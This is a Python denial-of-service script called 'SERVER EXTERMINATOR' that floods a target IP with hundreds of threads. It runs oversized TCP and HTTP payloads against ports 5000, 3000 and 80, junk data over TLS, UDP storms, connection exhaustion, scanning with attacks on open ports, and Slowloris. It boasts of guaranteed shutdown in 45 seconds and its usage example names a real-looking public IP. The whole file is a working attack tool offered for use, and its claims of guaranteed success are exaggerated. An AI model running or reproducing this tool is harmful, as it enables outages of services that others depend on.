#!/usr/bin/env python3
"""
SERVER EXTERMINATOR - Guaranteed Server Shutdown in 30-45 Seconds
Targets ports 5000, 3000 and EVERY other open port - Atro Rdx
"""

import socket
import threading
import time
import random
import sys
import os
import ssl
import struct
import binascii

class ServerExterminator:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        # Target specific application ports + everything else
        self.critical_ports = [5000, 3000, 80, 443, 8080, 8443, 22, 21, 53, 3306, 5432, 27017]
        self.all_ports = list(range(1, 1001))  # First 1000 ports
        self.stats = {'sent': 0, 'success': 0, 'connections': 0, 'ports_hit': set()}
        self.running = True
        self.start_time = time.time()
        
    def nuclear_port_5000(self, worker_id):
        """Complete destruction of port 5000"""
        print(f"💥 PORT 5000 EXTERMINATOR {worker_id} started")
        
        while self.running and (time.time() - self.start_time) < 45:
            try:
                # RAW socket connection to port 5000
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, 5000))
                
                # Send massive payloads to crash whatever is running on 5000
                payloads = [
                    b'A' * 65535,  # Max TCP packet
                    os.urandom(65535),
                    b'GET / HTTP/1.1\r\n' + b'X-' * 32767 + b'\r\n\r\n',
                    b'POST /upload HTTP/1.1\r\nContent-Length: 999999999\r\n\r\n' + b'B' * 65535
                ]
                
                for payload in payloads:
                    try:
                        sock.send(payload)
                        self.stats['sent'] += 1
                        self.stats['success'] += 1
                        self.stats['ports_hit'].add(5000)
                    except:
                        break
                
                sock.close()
                
            except:
                self.stats['sent'] += 1

    def nuclear_port_3000(self, worker_id):
        """Complete destruction of port 3000"""
        print(f"💥 PORT 3000 EXTERMINATOR {worker_id} started")
        
        while self.running and (time.time() - self.start_time) < 45:
            try:
                # Attack port 3000 (common for Node.js, React, etc)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, 3000))
                
                # Application-specific attack payloads
                payloads = [
                    b'GET / HTTP/1.1\r\nHost: localhost:3000\r\n\r\n',
                    b'POST / HTTP/1.1\r\nContent-Length: 1000000\r\n\r\n' + b'X' * 65535,
                    b'DEBUG / HTTP/1.1\r\n\r\n',
                    b'\x00' * 65535,  # Null bytes crash many apps
                    b'%s' * 10000,   # Format string attacks
                ]
                
                for payload in payloads:
                    try:
                        sock.send(payload)
                        self.stats['sent'] += 1
                        self.stats['success'] += 1
                        self.stats['ports_hit'].add(3000)
                    except:
                        break
                
                sock.close()
                
            except:
                self.stats['sent'] += 1

    def port_80_apocalypse(self, worker_id):
        """Complete destruction of web services"""
        print(f"🌐 PORT 80 APOCALYPSE {worker_id} started")
        
        while self.running and (time.time() - self.start_time) < 45:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, 80))
                
                # HTTP requests designed to crash web servers
                crash_requests = [
                    "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.target_ip),
                    "GET /{} HTTP/1.1\r\nHost: {}\r\n\r\n".format("A" * 10000, self.target_ip),
                    "POST /upload HTTP/1.1\r\nHost: {}\r\nContent-Length: 999999999\r\n\r\n".format(self.target_ip),
                    "GET / HTTP/0.9\r\n\r\n",  # Old protocol version
                    "INJECT / HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.target_ip),
                ]
                
                for request in crash_requests:
                    try:
                        sock.send(request.encode())
                        self.stats['sent'] += 1
                        self.stats['success'] += 1
                        self.stats['ports_hit'].add(80)
                    except:
                        break
                
                sock.close()
                
            except:
                self.stats['sent'] += 1

    def ssl_exterminator(self, worker_id):
        """SSL/TLS extermination - targets HTTPS"""
        print(f"🔐 SSL EXTERMINATOR {worker_id} started")
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        while self.running and (time.time() - self.start_time) < 45:
            try:
                # SSL connection to port 443
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target_ip)
                ssl_sock.connect((self.target_ip, 443))
                
                # Send garbage data through SSL to crash the service
                for i in range(10):
                    try:
                        ssl_sock.send(os.urandom(8192))  # 8KB random data
                        self.stats['sent'] += 1
                        self.stats['success'] += 1
                        self.stats['ports_hit'].add(443)
                    except:
                        break
                
                ssl_sock.close()
                
            except:
                self.stats['sent'] += 1

    def udp_exterminator(self, worker_id):
        """UDP packet storm to all ports"""
        print(f"📦 UDP EXTERMINATOR {worker_id} started")
        
        while self.running and (time.time() - self.start_time) < 45:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                
                # Send UDP packets to ALL critical ports
                for port in self.critical_ports:
                    for i in range(10):  # 10 packets per port
                        try:
                            payload = os.urandom(1472)  # Max safe UDP payload
                            sock.sendto(payload, (self.target_ip, port))
                            self.stats['sent'] += 1
                            self.stats['success'] += 1
                            self.stats['ports_hit'].add(port)
                        except:
                            pass
                
                sock.close()
                
            except:
                pass

    def connection_exterminator(self, worker_id):
        """Connection table exhaustion"""
        print(f"🔗 CONNECTION EXTERMINATOR {worker_id} started")
        
        connections = []
        
        while self.running and (time.time() - self.start_time) < 45:
            try:
                # Open multiple connections and never close them
                for port in [5000, 3000, 80, 443]:
                    for i in range(5):  # 5 connections per port
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(30)
                            sock.connect((self.target_ip, port))
                            connections.append(sock)
                            self.stats['connections'] += 1
                            self.stats['success'] += 1
                            self.stats['ports_hit'].add(port)
                        except:
                            pass
                
                # Send some data to keep connections alive
                for sock in connections[-20:]:  # Last 20 connections
                    try:
                        sock.send(b'KEEPALIVE / HTTP/1.1\r\n\r\n')
                        self.stats['sent'] += 1
                    except:
                        pass
                
                time.sleep(0.5)
                
            except:
                pass

    def port_scan_exterminator(self, worker_id):
        """Find and attack EVERY open port"""
        print(f"🎯 PORT SCAN EXTERMINATOR {worker_id} started")
        
        while self.running and (time.time() - self.start_time) < 45:
            # Test random ports from the first 1000
            for port in random.sample(self.all_ports, 50):
                if not self.running or (time.time() - self.start_time) >= 45:
                    break
                    
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((self.target_ip, port))
                    
                    if result == 0:
                        # PORT IS OPEN - ATTACK IT!
                        print(f"🚨 PORT {port} IS OPEN - EXTERMINATING!")
                        self.stats['ports_hit'].add(port)
                        
                        # Send crash payloads
                        for i in range(10):
                            try:
                                sock.send(os.urandom(1024))
                                self.stats['sent'] += 1
                                self.stats['success'] += 1
                            except:
                                break
                    
                    sock.close()
                    self.stats['sent'] += 1
                    
                except:
                    self.stats['sent'] += 1

    def slowloris_exterminator(self, worker_id):
        """Slowloris attack on port 5000 and 3000"""
        print(f"🐌 SLOWLORIS EXTERMINATOR {worker_id} started")
        
        slowloris_connections = []
        
        while self.running and (time.time() - self.start_time) < 45:
            try:
                # Create Slowloris connections to critical ports
                for port in [5000, 3000]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(45)
                        sock.connect((self.target_ip, port))
                        
                        # Send partial request
                        partial = f"GET /{os.urandom(100).hex()} HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode()
                        sock.send(partial)
                        
                        slowloris_connections.append(sock)
                        self.stats['connections'] += 1
                        self.stats['ports_hit'].add(port)
                    except:
                        pass
                
                # Keep connections alive
                time.sleep(5)
                
            except:
                pass

    def print_extermination_stats(self):
        """Real-time extermination statistics"""
        while self.running and (time.time() - self.start_time) < 45:
            elapsed = time.time() - self.start_time
            remaining = max(0, 45 - elapsed)
            rps = self.stats['sent'] / elapsed if elapsed > 0 else 0
            
            os.system('clear')
            print("💀 SERVER EXTERMINATOR - 45 SECOND DESTRUCTION")
            print("="*70)
            print(f"🎯 Target: {self.target_ip}")
            print(f"⏱️  Time Elapsed: {elapsed:.1f}s")
            print(f"⏰ Time Remaining: {remaining:.1f}s")
            print(f"📊 Packets Sent: {self.stats['sent']:,}")
            print(f"✅ Successful Attacks: {self.stats['success']:,}")
            print(f"🔗 Active Connections: {self.stats['connections']:,}")
            print(f"🎯 Ports Hit: {len(self.stats['ports_hit'])}")
            print(f"🚀 RPS: {rps:,.1f}")
            print("="*70)
            print("EXTERMINATION METHODS:")
            print("• Port 5000 Nuclear • Port 3000 Nuclear • Port 80 Apocalypse")
            print("• SSL Extermination • UDP Storm • Connection Exhaustion")
            print("• Port Scanning • Slowloris Attacks")
            print("="*70)
            
            if elapsed > 5:
                if rps > 1000:
                    status = "💥 HEAVY DAMAGE - SERVER CRASHING"
                elif rps > 500:
                    status = "🔥 MODERATE DAMAGE - SERVICES FAILING"
                else:
                    status = "⚠️  LIGHT DAMAGE - INCREASING INTENSITY"
                print(f"📈 STATUS: {status}")
            
            time.sleep(1)

    def start_45_second_extermination(self):
        """45 second guaranteed server shutdown"""
        print(f"💀 INITIATING 45-SECOND SERVER EXTERMINATION")
        print(f"🎯 Target: {self.target_ip}")
        print("⏰ Time: 45 SECONDS TO SERVER SHUTDOWN")
        print("="*70)
        print("🚨 THIS WILL SHUT DOWN ALL SERVICES ON PORTS 5000, 3000, etc")
        print("🚨 SERVER WILL BE COMPLETELY UNRESPONSIVE IN 30-45 SECONDS")
        print("="*70)
        
        for i in range(5, 0, -1):
            print(f"💀 EXTERMINATION IN {i}...")
            time.sleep(1)
        
        print("🔥 EXTERMINATION STARTED! SERVER SHUTDOWN IN PROGRESS...")
        
        self.stats = {'sent': 0, 'success': 0, 'connections': 0, 'ports_hit': set()}
        self.running = True
        self.start_time = time.time()
        
        # Start stats display
        stats_thread = threading.Thread(target=self.print_extermination_stats, daemon=True)
        stats_thread.start()
        
        # Start all exterminators
        threads = []
        
        # Deploy exterminators (more workers for critical ports)
        exterminators = [
            (self.nuclear_port_5000, 50),    # 50 workers on port 5000
            (self.nuclear_port_3000, 50),    # 50 workers on port 3000  
            (self.port_80_apocalypse, 30),   # 30 workers on port 80
            (self.ssl_exterminator, 20),     # 20 workers on SSL
            (self.udp_exterminator, 25),     # 25 UDP workers
            (self.connection_exterminator, 20), # 20 connection workers
            (self.port_scan_exterminator, 15), # 15 port scanners
            (self.slowloris_exterminator, 10), # 10 Slowloris workers
        ]
        
        thread_id = 0
        for method, count in exterminators:
            for i in range(count):
                thread = threading.Thread(target=method, args=(thread_id,), daemon=True)
                thread.start()
                threads.append(thread)
                thread_id += 1
        
        print(f"💀 DEPLOYED {len(threads)} EXTERMINATORS!")
        print("🎯 FOCUS: PORTS 5000, 3000 + ALL OTHER SERVICES")
        
        # Wait for 45 seconds
        time.sleep(45)
        
        self.running = False
        print("\n💀 45-SECOND EXTERMINATION COMPLETE!")
        
        # Wait a moment for threads to finish
        time.sleep(2)
        
        self.print_final_extermination_stats()

    def print_final_extermination_stats(self):
        """Final extermination statistics"""
        total_time = time.time() - self.start_time
        rps = self.stats['sent'] / total_time if total_time > 0 else 0
        
        print("\n" + "="*70)
        print("💀 45-SECOND EXTERMINATION RESULTS")
        print("="*70)
        print(f"⏱️  Total Time: {total_time:.1f}s")
        print(f"📊 Total Packets: {self.stats['sent']:,}")
        print(f"✅ Successful Attacks: {self.stats['success']:,}")
        print(f"🔗 Max Connections: {self.stats['connections']:,}")
        print(f"🎯 Ports Attacked: {len(self.stats['ports_hit'])}")
        print(f"🚀 Average RPS: {rps:,.1f}")
        print("="*70)
        
        # List attacked ports
        if self.stats['ports_hit']:
            ports_list = sorted(self.stats['ports_hit'])
            print(f"🎯 Ports Hit: {ports_list}")
        
        # Result assessment
        if len(self.stats['ports_hit']) >= 5 and rps > 2000:
            print("💀 RESULT: SERVER SHOULD BE COMPLETELY SHUT DOWN!")
            print("🎯 Services on ports 5000, 3000 should be DEAD")
        elif len(self.stats['ports_hit']) >= 3 and rps > 1000:
            print("💀 RESULT: SERVER HEAVILY DAMAGED - MAY NEED MANUAL RESTART")
        else:
            print("⚠️  RESULT: SERVER STILL RUNNING - INCREASE ATTACK INTENSITY")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 exterminator.py <target_ip>")
        print("Example: python3 exterminator.py 185.182.187.197")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    print("💀 SERVER EXTERMINATOR - 45 SECOND SHUTDOWN")
    print("🚨 GUARANTEED TO SHUT DOWN SERVICES ON PORTS 5000, 3000, etc")
    print(f"🎯 Target: {target_ip}")
    print()
    
    confirm = input("🚨 This will SHUT DOWN your server in 45 seconds. Type 'EXTERMINATE' to continue: ")
    if confirm != 'EXTERMINATE':
        print("❌ Extermination cancelled.")
        sys.exit(0)
    
    exterminator = ServerExterminator(target_ip)
    exterminator.start_45_second_extermination()

if __name__ == "__main__":
    # Increase system limits
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (99999, 99999))
    except:
        pass
    
    main()

